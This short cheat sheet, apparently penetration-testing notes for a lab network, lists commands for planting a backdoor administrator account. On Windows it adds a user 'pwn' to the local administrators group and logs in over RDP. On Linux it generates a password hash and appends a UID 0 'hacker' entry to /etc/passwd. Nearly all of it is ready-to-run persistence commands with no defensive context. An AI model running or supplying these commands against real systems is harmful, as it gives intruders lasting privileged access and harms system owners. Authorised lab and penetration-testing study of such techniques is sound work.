# Add New Admin User

## Windows

```text
net user pwn hacked /ADD
net localgroup administrators pwn /add
```

```bash
# https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements
net user pwn ThisIsOneUsersPass01 /add /y 
```

```bash
rdesktop -g 80% -u pwn -p ThisIsOneUsersPass01 10.11.1.x
```

## Linux

```bash
$ openssl passwd -1 -salt pwn pwned
$1$pwn$sX7TFgG1yRswJLX53dwzy1
```

Make sure to `echo` with single quotes.

```bash
echo 'hacker:$1$pwn$sX7TFgG1yRswJLX53dwzy1:0:0:root:/root:/bin/bash' >> /etc/passwd
```



